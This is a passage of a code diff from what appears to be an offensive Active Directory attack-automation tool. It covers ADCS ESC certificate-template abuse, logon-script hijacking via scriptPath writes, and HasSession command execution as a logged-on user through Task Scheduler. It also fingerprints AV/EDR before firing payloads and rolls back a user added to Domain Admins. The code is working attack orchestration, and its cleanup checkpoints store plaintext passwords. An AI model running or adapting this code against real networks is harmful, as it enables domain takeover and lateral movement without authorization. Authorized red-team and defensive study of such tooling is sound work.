+            ["Skip execution (Recommended)", "Choose a step to re-run"],
             default_idx=0,
         )
         if choice is None or choice == 0:
             return None
-        if choice == 1:
-            return first_executable_idx
-        if choice == 2:
-            return _choose_custom_attack_path_start_step(
-                shell,
-                steps=steps,
-                executable_indices=executable_indices,
-                default_step_idx=first_executable_idx,
-            )
-        return None
-
-    if completed_steps <= 0:
-        return default_start_idx
-    if non_interactive:
-        return default_start_idx
-
-    resume_label = (
-        "first pending step" if first_pending_idx is not None else "first required step"
-    )
-
-    if not hasattr(shell, "_questionary_select"):
-        print_info(f"Resuming from step #{default_start_idx} ({resume_label}).")
-        print_info_verbose(f"Skipping {completed_steps} previously successful step(s).")
-        return default_start_idx
-
-    options = [
-        f"Resume from step #{default_start_idx} (Recommended)",
-        f"Re-run from step #{first_executable_idx}",
-        "Choose custom start step",
-        "Cancel execution",
-    ]
-    choice = shell._questionary_select(
-        "This path is partially executed. Choose how to continue:",
-        options,
-        default_idx=0,
-    )
-    if choice is None or choice >= len(options) - 1:
-        return None
-    if choice == 0:
-        print_info(f"Resuming from step #{default_start_idx} ({resume_label}).")
-        return default_start_idx
-    if choice == 1:
-        return first_executable_idx
-    if choice == 2:
         return _choose_custom_attack_path_start_step(
             shell,
+            domain=domain,
+            summary=summary,
             steps=steps,
             executable_indices=executable_indices,
-            default_step_idx=default_start_idx,
+            default_step_idx=first_executable_idx,
+            context_username=context_username,
+            context_password=context_password,
         )
-    return None
+
+    if first_execution_required_idx is None:
+        print_info(
+            "All executable steps in this attack path are already marked as success."
+        )
+        choice = shell._questionary_select(
+            "What do you want to do?",
+            ["Skip execution (Recommended)", "Choose a step to re-run"],
+            default_idx=0,
+        )
+        if choice is None or choice == 0:
+            return None
+        return _choose_custom_attack_path_start_step(
+            shell,
+            domain=domain,
+            summary=summary,
+            steps=steps,
+            executable_indices=executable_indices,
+            default_step_idx=first_executable_idx,
+            context_username=context_username,
+            context_password=context_password,
+        )
+
+    # Normal case: show step selector directly with smart default pre-selected
+    if len(executable_indices) == 1:
+        return default_start_idx
+    return _choose_custom_attack_path_start_step(
+        shell,
+        domain=domain,
+        summary=summary,
+        steps=steps,
+        executable_indices=executable_indices,
+        default_step_idx=default_start_idx,
+        context_username=context_username,
+        context_password=context_password,
+    )
 
 
 def _extract_cert_template_name_from_label(
@@ -1843,8 +2402,33 @@ def _extract_cert_templates_from_step_details(
     template_field: str = "template",
     list_field: str = "templates",
     summary_field: str = "templates_summary",
+    include_vulnerable_resources: bool = True,
 ) -> list[str]:
-    """Extract certificate template names from attack-step details."""
+    """Extract certificate template names from attack-step details.
+
+    When *include_vulnerable_resources* is True (the default), the collector-
+    populated vulnerable_resources list is checked first and returned as the
+    authoritative source if it contains any CertTemplate entries.  Pass
+    include_vulnerable_resources=False for role-scoped lookups (agent /
+    target) where vulnerable_resources is not role-specific.
+    """
+
+    # Priority 1: collector-authoritative vulnerable_resources list.
+    if include_vulnerable_resources:
+        vr_list = details.get("vulnerable_resources")
+        if isinstance(vr_list, list):
+            vr_names: list[str] = []
+            for entry in vr_list:
+                if not isinstance(entry, dict):
+                    continue
+                kind = str(entry.get("kind") or "").strip().lower()
+                if kind not in {"certtemplate", "certificatetemplate"}:
+                    continue
+                name = entry.get("name")
+                if isinstance(name, str) and name.strip():
+                    vr_names.append(name.strip())
+            if vr_names:
+                return sorted({n for n in vr_names}, key=str.lower)
 
     templates: list[str] = []
 
@@ -1920,6 +2504,17 @@ def _extract_effective_group_from_step_details(details: dict[str, Any]) -> str |
     return None
 
 
+def _attack_path_label_to_name(label: str | None) -> str | None:
+    """Return the SAM-like left side from an attack-path label."""
+    raw = str(label or "").strip()
+    if not raw:
+        return None
+    if "@" in raw:
+        left, _, _ = raw.partition("@")
+        return left.strip() or None
+    return raw
+
+
 def _extract_cert_templates_by_role(
     details: dict[str, Any],
     *,
@@ -1934,6 +2529,7 @@ def _extract_cert_templates_by_role(
         template_field=f"{role_key}_template",
         list_field=f"{role_key}_templates",
         summary_field=f"{role_key}_templates_summary",
+        include_vulnerable_resources=False,
     )
 
 
@@ -1982,12 +2578,16 @@ def _resolve_adcs_template_candidates(
     to_label: str | None,
     domain_data: dict[str, Any],
     allow_object_control: bool = False,
+    allow_target_label_template: bool = True,
 ) -> list[str]:
     """Resolve certificate templates for an ADCS ESC step."""
 
     esc_tag = str(esc_number).strip()
     esc_templates = _extract_cert_templates_from_step_details(details)
     if esc_templates:
+        from adscan_internal.cli.adcs_exploitation import _resolve_template_cn
+
+        esc_templates = [_resolve_template_cn(shell, domain, t) for t in esc_templates]
         marked = ", ".join(mark_sensitive(t, "service") for t in esc_templates)
         print_info_debug(
             f"[adcsesc{esc_tag}] Using certificate template(s) from attack step details: "
@@ -1995,87 +2595,53 @@ def _resolve_adcs_template_candidates(
         )
         return esc_templates
 
-    template_from_step = _extract_cert_template_name_from_label(
-        domain=domain,
-        to_label=to_label,
-    )
-    if template_from_step:
-        print_info_debug(
-            f"[adcsesc{esc_tag}] Using certificate template from attack step target: "
-            f"{mark_sensitive(template_from_step, 'service')}"
-        )
-        return [template_from_step]
+    if allow_target_label_template:
+        # Only treat the target label as a template name when the edge actually
+        # targets a CertTemplate node.  For derived ESC edges the to_label is a
+        # user or group — using it as a template name causes CA rejections.
+        target_kind = str(details.get("target_kind") or "").strip().lower()
+        if target_kind in {"certtemplate", "certificatetemplate"}:
+            template_from_step = _extract_cert_template_name_from_label(
+                domain=domain,
+                to_label=to_label,
+            )
+            if template_from_step:
+                from adscan_internal.cli.adcs_exploitation import _resolve_template_cn
+
+                template_from_step = _resolve_template_cn(shell, domain, template_from_step)
+                print_info_debug(
+                    f"[adcsesc{esc_tag}] Using certificate template from attack step target: "
+                    f"{mark_sensitive(template_from_step, 'service')}"
+                )
+                return [template_from_step]
+
+    domain_dir = domain_data.get("dir")
 
     if allow_object_control:
-        try:
-            from adscan_internal.services.attack_graph_service import (
-                resolve_certipy_esc4_templates_for_principal,
-            )
-
-            esc_templates = resolve_certipy_esc4_templates_for_principal(
-                shell,
-                domain=domain,
-                principal_samaccountname=exec_username,
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            esc_templates = []
-        if esc_templates:
-            return esc_templates
-
-    try:
-        from adscan_internal.services.exploitation import ExploitationService
-
-        pdc_hostname = domain_data.get("pdc_hostname")
-        target_host = None
-        if isinstance(pdc_hostname, str) and pdc_hostname.strip():
-            target_host = (
-                pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
-            )
-        auth = shell.build_auth_certipy(domain, exec_username, password)
-        output_prefix = None
-        domain_dir = domain_data.get("dir")
+        # Try native inventory first (ESC4 — template write access).
         if isinstance(domain_dir, str) and domain_dir:
-            adcs_dir = os.path.join(domain_dir, "adcs")
-            os.makedirs(adcs_dir, exist_ok=True)
-            if allow_object_control:
-                safe_user = re.sub(r"[^a-zA-Z0-9_.-]+", "_", exec_username)
-                output_prefix = os.path.join(adcs_dir, f"certipy_find_{safe_user}")
-            else:
-                output_prefix = os.path.join(adcs_dir, "certipy_find")
-        service = ExploitationService()
-        result = service.adcs.enum_privileges(
-            certipy_path=shell.certipy_path,
-            pdc_ip=domain_data["pdc"],
-            target_host=target_host,
-            auth_string=auth,
-            output_prefix=output_prefix,
-            timeout=300,
-            run_command=getattr(shell, "run_command", None),
-            vulnerable_only=bool(allow_object_control),
-            use_cached_json=not allow_object_control,
-        )
-    except Exception as exc:  # noqa: BLE001
-        telemetry.capture_exception(exc)
-        print_warning(
-            f"Failed to enumerate ADCS templates for ESC{mark_sensitive(esc_tag, 'service')}."
-        )
-        return []
+            try:
+                from adscan_internal.services.attack_graph_service import (
+                    _attack_path_get_recursive_groups,
+                    resolve_esc4_templates_from_inventory,
+                )
 
-    if not getattr(result, "success", False):
-        print_warning(
-            "ADCS privilege enumeration failed; cannot select "
-            f"ESC{mark_sensitive(esc_tag, 'service')} template."
-        )
-        return []
+                groups = _attack_path_get_recursive_groups(
+                    shell, domain=domain, samaccountname=exec_username
+                )
+                inv_templates = resolve_esc4_templates_from_inventory(
+                    domain_dir, username=exec_username, groups=groups
+                )
+                if inv_templates is not None:
+                    print_info_verbose(
+                        f"[ADCS] ESC4 templates from native inventory: {inv_templates or 'none'}"
+                    )
+                    if inv_templates:
+                        return inv_templates
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
 
-    esc_templates = [
-        v.template
-        for v in getattr(result, "vulnerabilities", [])
-        if getattr(v, "esc_number", None) == esc_tag and getattr(v, "template", None)
-    ]
-    esc_templates = [t for t in esc_templates if isinstance(t, str) and t.strip()]
-    return sorted(set(esc_templates), key=str.lower)
+    return []
 
 
 def _prompt_for_manual_adcs_template(
@@ -2085,7 +2651,7 @@ def _prompt_for_manual_adcs_template(
 ) -> str | None:
     """Prompt the operator for a manual certificate template name."""
 
-    if os.getenv("CI") or not sys.stdin.isatty() or not sys.stdout.isatty():
+    if is_non_interactive():
         return None
 
     prompt_default = default or ""
@@ -2187,14 +2753,6 @@ def _resolve_golden_cert_target_host(
     return None
 
 
-def _sorted_paths(paths: list[dict[str, Any]]) -> list[dict[str, Any]]:
-    from adscan_internal.services.attack_step_support_registry import (
-        build_path_priority_key,
-    )
-
-    return sorted(paths, key=build_path_priority_key)
-
-
 def _find_first_step(summary: dict[str, Any], *, action: str) -> dict[str, Any] | None:
     steps = summary.get("steps")
     if not isinstance(steps, list):
@@ -2223,6 +2781,96 @@ def _resolve_domain_password(shell: object, domain: str, username: str) -> str |
     if not isinstance(value, str) or not value:
         return None
     return value
+
+
+def _resolve_workspace_dir(shell: Any, domain: str) -> str:
+    """Return the workspace directory for a domain."""
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    if isinstance(domain_data, dict):
+        d = domain_data.get("dir") or ""
+        if d:
+            return str(d)
+    return str(getattr(shell, "current_workspace_dir", "") or "")
+
+
+def _resolve_ca_fqdn(domain_data: dict[str, Any]) -> str | None:
+    """Resolve the CA FQDN from workspace data.
+
+    Resolution order:
+      1. Explicit adcs_fqdn written at collection time (first-class, always a hostname).
+      2. adcs field when it contains an FQDN (legacy fallback for older workspaces).
+    Returns None when neither source yields a usable hostname.
+    """
+    from adscan_internal.services._kerberos_spn import is_ip_address
+
+    explicit = domain_data.get("adcs_fqdn")
+    if (
+        isinstance(explicit, str)
+        and explicit.strip()
+        and not is_ip_address(explicit.strip())
+    ):
+        return explicit.strip()
+
+    adcs = domain_data.get("adcs")
+    if isinstance(adcs, str):
+        candidate = adcs.strip()
+        if candidate and "." in candidate and not is_ip_address(candidate):
+            return candidate
+    return None
+
+
+def _resolve_target_upn(to_label: str | None, domain: str) -> str:
+    """Resolve the target UPN from the attack step's to_label."""
+    label = str(to_label or "").strip()
+    if "@" in label:
+        return label.casefold()
+    label_lower = label.casefold()
+    if label_lower == domain.casefold() or label_lower.endswith(
+        "." + domain.casefold()
+    ):
+        return f"administrator@{domain}"
+    return f"{label}@{domain}"
+
+
+def _resolve_esc9_puppet_user(details: dict[str, Any], domain: str) -> str | None:
+    """Return the sAMAccountName of the puppet user for ESC9/10 from edge notes.
+
+    The puppet user is the account whose UPN the attacker modifies during the
+    ESC9/10 chain. It is stored in ``vulnerable_resources`` with ``role=puppet``
+    when the precondition collector derived the edge correctly.
+    """
+    resources = details.get("vulnerable_resources") or []
+    for res in resources:
+        if not isinstance(res, dict):
+            continue
+        if str(res.get("kind") or "").lower() != "user":
+            continue
+        if str(res.get("role") or "").lower() != "puppet":
+            continue
+        name = str(res.get("name") or "").strip()
+        if not name:
+            continue
+        # Strip realm suffix when present (name is stored as user@domain.local).
+        if "@" in name:
+            name = name.split("@", 1)[0]
+        return name
+    return None
+
+
+def _resolve_esc9_puppet_dn(details: dict[str, Any]) -> str | None:
+    """Return the LDAP distinguished name of the ESC9/10 puppet user from edge notes."""
+    resources = details.get("vulnerable_resources") or []
+    for res in resources:
+        if not isinstance(res, dict):
+            continue
+        if str(res.get("kind") or "").lower() != "user":
+            continue
+        if str(res.get("role") or "").lower() != "puppet":
+            continue
+        dn = str(res.get("distinguished_name") or "").strip()
+        if dn:
+            return dn
+    return None
 
 
 def _resolve_default_domain_controller(
@@ -2641,29 +3289,25 @@ def _execute_writelogonscript_force_change_password_strategy(
         domain_data=domain_data,
     )
 
-    bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
-    if not bloody_path:
-        return (
-            "failed",
-            {
-                "reason": "missing_bloodyad_path",
-                "share": str(precheck_notes.get("share") or ""),
-                "path": str(precheck_notes.get("path") or ""),
-            },
-        )
+    from adscan_internal.cli.exploits import _resolve_impacket_executor_ccache
 
+    exec_ccache = (
+        _resolve_impacket_executor_ccache(shell, domain, exec_username)
+        if use_kerberos
+        else None
+    )
     service = ExploitationService()
     previous_script_path = ""
     previous_script_path_readable = False
     get_attrs_result = service.acl.get_object_attributes(
         pdc_host=target_host,
-        bloody_path=bloody_path,
         domain=domain,
         username=exec_username,
         password=password,
         target_object=target_object,
         attribute_names=("scriptPath",),
         kerberos=use_kerberos,
+        ccache=exec_ccache,
         timeout=180,
     )
     if get_attrs_result.success:
@@ -2811,13 +3455,13 @@ def _execute_writelogonscript_force_change_password_strategy(
         )
     set_result = service.acl.set_user_logon_script(
         pdc_host=target_host,
-        bloody_path=bloody_path,
         domain=domain,
         username=exec_username,
         password=password,
         target_object=target_object,
         script_path=payload.script_path_value,
         kerberos=use_kerberos,
+        ccache=exec_ccache,
         timeout=180,
     )
     if not set_result.success:
@@ -3205,13 +3849,11 @@ def _attempt_writelogonscript_cleanup_if_ready(
             kdc_host=target_host if use_kerberos else None,
         )
         service = ExploitationService()
-        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
         revert_success = False
         revert_error = ""
-        if bloody_path and previous_readable:
+        if previous_readable:
             revert_result = service.acl.set_user_logon_script(
                 pdc_host=target_host,
-                bloody_path=bloody_path,
                 domain=domain,
                 username=cleanup_user,
                 password=cleanup_password,
@@ -3333,7 +3975,203 @@ def _run_netexec_for_domain(
     return shell.run_command(command, timeout=timeout)
 
 
-def _run_hassession_schtask_command(
+_HASSESSION_LEGACY_NETEXEC = os.getenv(
+    "ADSCAN_HASSESSION_LEGACY_NETEXEC", ""
+).strip().lower() in {"1", "true", "yes", "on"}
+
+
+def _looks_like_nt_hash(value: str) -> bool:
+    """Return True if ``value`` looks like a 32-hex NT hash (or LM:NT pair)."""
+    raw = str(value or "").strip()
+    if not raw:
+        return False
+    if ":" in raw:
+        raw = raw.split(":", 1)[1]
+    return len(raw) == 32 and all(c in "0123456789abcdefABCDEF" for c in raw)
+
+
+def _resolve_session_target_ip(target_host: str) -> str:
+    """Resolve ``target_host`` to an IPv4 string when it is not already one."""
+    import ipaddress as _ipaddress
+    import socket as _socket
+
+    raw = str(target_host or "").strip()
+    if not raw:
+        return raw
+    try:
+        _ipaddress.ip_address(raw)
+        return raw
+    except ValueError:
+        pass
+    try:
+        return _socket.gethostbyname(raw)
+    except OSError:
+        return raw
+
+
+def _hassession_av_edr_gate(
+    shell: Any,
+    *,
+    domain: str,
+    target_host: str,
+    target_user: str,
+    session_user: str,
+    exec_username: str,
+    exec_password: str,
+    non_interactive: bool,
+) -> str:
+    """Pre-flight AV/EDR gate for HasSession exploitation.
+
+    Runs ``HostFingerprintService.fingerprint`` against the target via the
+    same SMB credentials we are about to use for schtask. Renders the result
+    in a Rich panel matching the live HasSession UX (green/yellow/red border
+    based on risk) and asks the operator to confirm before the schtask
+    payload fires.
+
+    Returns one of:
+        "proceed"  → caller continues with exploitation
+        "abort"    → operator chose to cancel; caller returns immediately
+    """
+    from adscan_internal.services.exploitation.hassession_native import (
+        fingerprint_target_host_sync,
+    )
+    from adscan_internal.services.remote_exec import (
+        build_smb_config_from_credential,
+    )
+
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
+    pdc_ip = str(domain_data.get("pdc") or "").strip() or None
+    target_ip = _resolve_session_target_ip(target_host)
+    secret_kind = "nt_hash" if _looks_like_nt_hash(exec_password) else "password"
+    config = build_smb_config_from_credential(
+        domain=domain,
+        username=exec_username,
+        secret=exec_password,
+        secret_kind=secret_kind,
+        target_host=target_host,
+        target_ip=target_ip,
+        kdc_ip=pdc_ip,
+        auth_domain=domain,
+        prefer_kerberos=False,
+        timeout=30,
+    )
+
+    print_info(
+        f"[hassession] Fingerprinting AV/EDR on {mark_sensitive(target_host, 'hostname')}…"
+    )
+    fp = fingerprint_target_host_sync(config)
+
+    # Render the banner using the same widget helper the live view uses, but
+    # standalone so the operator sees it BEFORE the live panel takes over.
+    from rich.padding import Padding as _Padding
+    from rich.panel import Panel as _Panel
+    from rich.table import Table as _Table
+    from rich.text import Text as _Text
+
+    has_edr = bool(getattr(fp, "has_edr", False))
+    has_av = bool(getattr(fp, "has_av", False))
+    defender_rtp = bool(getattr(fp, "defender_rtp", True))
+    active_products = list(getattr(fp, "active_products", []) or [])
+    fp_error = getattr(fp, "error", None)
+
+    if fp is None:
+        # fingerprint returned None — target unreachable for fingerprint
+        print_warning(
+            "[hassession] AV/EDR fingerprint unavailable (target may not "
+            "expose RemoteRegistry / IPC$). Proceeding without pre-check."
+        )
+        return "proceed"
+
+    if has_edr:
+        border, icon, headline = (
+            "red",
+            "🛑",
+            "EDR ACTIVE on target — schtask payload may be killed",
+        )
+        risk_level = "high"
+    elif has_av or (defender_rtp and active_products):
+        border, icon, headline = (
+            "yellow",
+            "⚠ ",
+            "AV active on target — Defender may quarantine output",
+        )
+        risk_level = "medium"
+    else:
+        border, icon, headline = "green", "✓ ", "No active AV/EDR detected on target"
+        risk_level = "low"
+
+    body = _Table.grid(padding=(0, 1))
+    body.add_column(no_wrap=True)
+    body.add_column(no_wrap=False)
+    head = _Text()
+    head.append(f"{icon} ", style="bold")
+    head.append(headline, style=f"bold {border}")
+    body.add_row("", head)
+
+    if fp_error:
+        line = _Text()
+        line.append("  ⚠ partial fingerprint: ", style="dim")
+        line.append(str(fp_error)[:140], style="dim")
+        body.add_row("", line)
+
+    if active_products:
+        for product in active_products:
+            pname = str(getattr(product, "name", "unknown"))
+            category = str(getattr(product, "category", "")).upper()
+            status = str(getattr(product, "status_label", ""))
+            line = _Text()
+            line.append(f"  {category:>3s}  ", style="dim")
+            line.append(pname, style="bold")
+            line.append("  ·  ", style="dim")
+            line.append(status, style="red" if category == "EDR" else "yellow")
+            body.add_row("", line)
+    else:
+        line = _Text()
+        line.append("  No catalog matches.  ", style="dim")
+        line.append("Defender RTP=", style="dim")
+        line.append(
+            "ON" if defender_rtp else "OFF", style="red" if defender_rtp else "green"
+        )
+        body.add_row("", line)
+
+    elapsed = getattr(fp, "elapsed_s", 0.0)
+    footer = _Text()
+    footer.append(f"  fingerprint took {elapsed:0.1f}s  ·  target ", style="dim")
+    footer.append(mark_sensitive(target_host, "hostname"), style="dim")
+    body.add_row("", footer)
+
+    panel = _Panel(
+        _Padding(body, (1, 1)),
+        title="[bold]HasSession · AV / EDR pre-check[/bold]",
+        border_style=border,
+        expand=False,
+    )
+    from adscan_internal import get_console as _get_console
+
+    _get_console().print(panel)
+
+    # Bind the fingerprint to the live context so the live panel reuses it.
+    # The HasSessionLiveContext has no fingerprint field today; we attach it
+    # as an opaque attribute the live view can pick up via set_fingerprint.
+    setattr(shell, "_hassession_last_fingerprint", fp)
+
+    if non_interactive or risk_level == "low":
+        return "proceed"
+
+    if risk_level == "high":
+        prompt = "EDR is active and may kill the schtask payload. Proceed anyway?"
+        default = False
+    else:
+        prompt = "AV is active — output may be quarantined. Proceed with exploitation?"
+        default = True
+
+    if Confirm.ask(prompt, default=default):
+        return "proceed"
+    print_info("[hassession] Exploitation aborted at AV/EDR gate.")
+    return "abort"
+
+
+def _run_hassession_schtask_command_native(
     shell: Any,
     *,
     domain: str,
@@ -3344,12 +4182,104 @@ def _run_hassession_schtask_command(
     command_to_run: str,
     log_suffix: str,
 ) -> tuple[bool, str]:
-    """Execute NetExec `schtask_as` for HasSession abuse on a target host."""
+    """Execute schtask_as natively via aiosmb Task Scheduler RPC.
+
+    Replaces the legacy NetExec ``-M schtask_as`` subprocess call with a fully
+    async aiosmb implementation (no subprocess, no netexec dependency, premium
+    Rich live UX). Same return contract as the legacy helper:
+    ``(success, combined_stdout_stderr)``.
+    """
+    from adscan_internal.cli.widgets.hassession_live import (
+        HasSessionLiveContext,
+        HasSessionLiveView,
+    )
+    from adscan_internal.services.exploitation.hassession_native import (
+        run_command_as_session_user_sync,
+    )
+    from adscan_internal.services.remote_exec import (
+        build_smb_config_from_credential,
+    )
+
     marked_host = mark_sensitive(target_host, "hostname")
     marked_exec_user = mark_sensitive(exec_username, "user")
     marked_session_user = mark_sensitive(session_user, "user")
     print_info_debug(
-        "[hassession] Running schtask_as on "
+        "[hassession-native] schtask_as on "
+        f"{marked_host} as session user {marked_session_user} "
+        f"(executor: {marked_exec_user})."
+    )
+
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
+    pdc_ip = str(domain_data.get("pdc") or "").strip() or None
+    target_ip = _resolve_session_target_ip(target_host)
+
+    secret_kind = "nt_hash" if _looks_like_nt_hash(exec_password) else "password"
+    config = build_smb_config_from_credential(
+        domain=domain,
+        username=exec_username,
+        secret=exec_password,
+        secret_kind=secret_kind,
+        target_host=target_host,
+        target_ip=target_ip,
+        kdc_ip=pdc_ip,
+        auth_domain=domain,
+        prefer_kerberos=False,
+        timeout=30,
+    )
+
+    short_command = command_to_run.strip()
+    if len(short_command) > 96:
+        short_command = short_command[:93] + "…"
+    live_ctx = HasSessionLiveContext(
+        target_host=target_host,
+        target_ip=target_ip,
+        session_user=session_user,
+        executor_user=exec_username,
+        auth_kind="NTLM" if secret_kind == "password" else "NTLM (NT hash)",
+        command_label=short_command,
+    )
+
+    cached_fp = getattr(shell, "_hassession_last_fingerprint", None)
+
+    with HasSessionLiveView(live_ctx) as live:
+        if cached_fp is not None:
+            live.set_fingerprint(cached_fp)
+        result = run_command_as_session_user_sync(
+            config,
+            session_user,
+            command_to_run,
+            progress=live.on_event,
+        )
+        live.set_final(result)
+
+    output = result.output or ""
+    if not result.success and result.error:
+        output = (output + "\n" + result.error).strip() if output else result.error
+
+    return bool(result.success), output
+
+
+def _run_hassession_schtask_command_legacy(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str,
+    exec_password: str,
+    target_host: str,
+    session_user: str,
+    command_to_run: str,
+    log_suffix: str,
+) -> tuple[bool, str]:
+    """Legacy NetExec ``-M schtask_as`` path.
+
+    Kept behind the ``ADSCAN_HASSESSION_LEGACY_NETEXEC=1`` env flag for one
+    release as a safety net. Will be removed once the native path has soaked.
+    """
+    marked_host = mark_sensitive(target_host, "hostname")
+    marked_exec_user = mark_sensitive(exec_username, "user")
+    marked_session_user = mark_sensitive(session_user, "user")
+    print_info_debug(
+        "[hassession-legacy] Running schtask_as on "
         f"{marked_host} as session user {marked_session_user} "
         f"(executor: {marked_exec_user})."
     )
@@ -3380,6 +4310,35 @@ def _run_hassession_schtask_command(
     stderr = str(getattr(result, "stderr", "") or "")
     output = "\n".join(part for part in (stdout, stderr) if part)
     return bool(getattr(result, "returncode", 1) == 0), output
+
+
+def _run_hassession_schtask_command(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str,
+    exec_password: str,
+    target_host: str,
+    session_user: str,
+    command_to_run: str,
+    log_suffix: str,
+) -> tuple[bool, str]:
+    """Dispatch HasSession schtask_as to the native or legacy backend."""
+    backend = (
+        _run_hassession_schtask_command_legacy
+        if _HASSESSION_LEGACY_NETEXEC
+        else _run_hassession_schtask_command_native
+    )
+    return backend(
+        shell,
+        domain=domain,
+        exec_username=exec_username,
+        exec_password=exec_password,
+        target_host=target_host,
+        session_user=session_user,
+        command_to_run=command_to_run,
+        log_suffix=log_suffix,
+    )
 
 
 def _resolve_exec_password_for_user(
@@ -3757,6 +4716,274 @@ def _wait_for_hassession_membership_propagation(
     time.sleep(delay_seconds)
 
 
+def _write_hassession_cleanup_checkpoint(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str,
+    target_password: str | None,
+    target_host: str,
+    session_user: str,
+    exec_username: str,
+    exec_password: str,
+    user_created_by_us: bool,
+    group_candidates: list[str],
+) -> None:
+    """Persist a cleanup checkpoint so HasSession artifacts survive crashes.
+
+    Written before the user is added to Domain Admins so that even a crash
+    mid-exploitation leaves a recoverable record. Cleared by
+    :func:`_clear_hassession_cleanup_checkpoint` after successful rollback.
+    """
+    import json as _json
+
+    workspace_dir = _resolve_workspace_dir(shell, domain)
+    if not workspace_dir:
+        return
+    checkpoint_path = os.path.join(
+        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
+    )
+    os.makedirs(os.path.dirname(checkpoint_path), exist_ok=True)
+    payload: dict[str, Any] = {
+        "target_user": target_user,
+        "target_password": target_password,
+        "target_host": target_host,
+        "session_user": session_user,
+        "exec_username": exec_username,
+        "exec_password": exec_password,
+        "user_created_by_us": user_created_by_us,
+        "group_candidates": group_candidates,
+        "created_at": datetime.now(UTC).isoformat(),
+        "rollback_done": False,
+    }
+    try:
+        with open(checkpoint_path, "w", encoding="utf-8") as fh:
+            _json.dump(payload, fh, indent=2)
+        print_info_debug(
+            f"[hassession] Cleanup checkpoint written: "
+            f"{mark_sensitive(target_user, 'user')} @ "
+            f"{mark_sensitive(domain, 'domain')}"
+        )
+    except OSError as exc:
+        telemetry.capture_exception(exc)
+        print_info_debug(f"[hassession] Could not write cleanup checkpoint: {exc}")
+
+
+def _clear_hassession_cleanup_checkpoint(shell: Any, *, domain: str) -> None:
+    """Remove the pending-cleanup checkpoint after successful rollback."""
+    workspace_dir = _resolve_workspace_dir(shell, domain)
+    if not workspace_dir:
+        return
+    checkpoint_path = os.path.join(
+        workspace_dir, "domains", domain, "hassession_cleanup_pending.json"
+    )
+    try:
+        if os.path.exists(checkpoint_path):
+            os.remove(checkpoint_path)
+    except OSError as exc:
+        telemetry.capture_exception(exc)
+        print_info_debug(f"[hassession] Could not remove cleanup checkpoint: {exc}")
+
+
+def _run_hassession_rollback(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str,
+    exec_password: str,
+    target_host: str,
+    session_user: str,
+    target_user: str,
+    target_password: str | None,
+    user_created_by_us: bool,
+    group_candidates: list[str],
+    non_interactive: bool = False,
+) -> None:
+    """Remove the HasSession artifact user from the domain.
+
+    Execution order:
+      1. Remove from Domain Admins — ``net group "<DA>" "{user}" /delete /domain``
+         (all candidate group names, so we don't miss a localised DA group).
+      2. If ADscan created the user, delete it — ``net user "{user}" /delete /domain``.
+
+    Both commands run via the same schtask-as channel used during exploitation
+    (session_user's interactive logon session). If the target user has DA creds
+    at this point, those are tried as a fallback for the LDAP delete so the
+    rollback succeeds even if the session user has logged off.
+    """
+    marked_user = mark_sensitive(target_user, "user")
+    marked_domain = mark_sensitive(domain, "domain")
+    print_info(
+        f"[rollback] Removing HasSession artifact {marked_user} from {marked_domain}…"
+    )
+
+    # Remove from every candidate DA group (only whichever we actually added
+    # the user to will respond with success; the others will return "not a member",
+    # which we treat as acceptable).
+    for group_name in group_candidates:
+        remove_group_cmd = f'net group "{group_name}" "{target_user}" /delete /domain'
+        try:
+            ok, output = _run_hassession_schtask_command(
+                shell,
+                domain=domain,
+                exec_username=exec_username,
+                exec_password=exec_password,
+                target_host=target_host,
+                session_user=session_user,
+                command_to_run=remove_group_cmd,
+                log_suffix=f"rollback_rmgrp_{_sanitize_filename_token(group_name, fallback='group')}",
+            )
+            if ok:
+                print_info(f"[rollback] {marked_user} removed from '{group_name}'.")
+            else:
+                lowered = (output or "").lower()
+                if any(
+                    m in lowered
+                    for m in (
+                        "not a member",
+                        "no es miembro",
+                        "membre",
+                        "3",
+                        "no member",
+                    )
+                ):
+                    print_info_debug(
+                        f"[rollback] {marked_user} was not in '{group_name}' — skipping."
+                    )
+                else:
+                    print_warning(
+                        f"[rollback] Could not remove {marked_user} from '{group_name}': "
+                        f"{output[:120] if output else 'no output'}"
+                    )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_warning(f"[rollback] Group removal raised: {exc}")
+
+    if not user_created_by_us:
+        print_info_debug(
+            f"[rollback] User {marked_user} was pre-existing — skip account deletion."
+        )
+        return
+
+    # Delete the account we created.
+    delete_cmd = f'net user "{target_user}" /delete /domain'
+    deleted = False
+
+    # Primary: run as session_user (schtask channel)
+    try:
+        ok, output = _run_hassession_schtask_command(
+            shell,
+            domain=domain,
+            exec_username=exec_username,
+            exec_password=exec_password,
+            target_host=target_host,
+            session_user=session_user,
+            command_to_run=delete_cmd,
+            log_suffix="rollback_delusr",
+        )
+        if ok:
+            print_info(f"[rollback] Account {marked_user} deleted from domain.")
+            deleted = True
+        else:
+            print_warning(
+                f"[rollback] schtask delete returned failure for {marked_user}: "
+                f"{output[:120] if output else 'no output'}"
+            )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_warning(f"[rollback] schtask delete raised: {exc}")
+
+    # Fallback: if the created user has DA creds (target_password), try a
+    # direct netexec delete so the rollback succeeds even if robb.stark
+    # has logged off by this point.
+    if not deleted and target_password:
+        try:
+            fallback_cmd = (
+                f"{shell.netexec_path} ldap {shlex.quote(domain)} "
+                f"-u {shlex.quote(target_user)} -p {shlex.quote(target_password)} "
+                f"--del-user {shlex.quote(target_user)}"
+            )
+            result = _run_netexec_for_domain(
+                shell, domain=domain, command=fallback_cmd, timeout=60
+            )
+            if result is not None and getattr(result, "returncode", 1) == 0:
+                print_info(
+                    f"[rollback] Account {marked_user} deleted via LDAP fallback."
+                )
+                deleted = True
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
